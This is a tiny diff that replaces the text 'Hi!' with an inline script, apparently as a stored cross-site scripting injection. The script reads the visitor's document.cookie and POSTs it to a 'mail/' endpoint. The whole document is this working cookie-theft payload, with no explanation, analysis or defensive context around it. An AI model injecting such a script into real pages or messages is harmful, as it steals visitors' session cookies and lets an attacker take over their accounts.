@@ -1,1 +1,5 @@
-Hi!
+<script>
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open("POST", "mail/", true);
+    xmlHttp.send(JSON.stringify({ content: document.cookie }));
+</script>
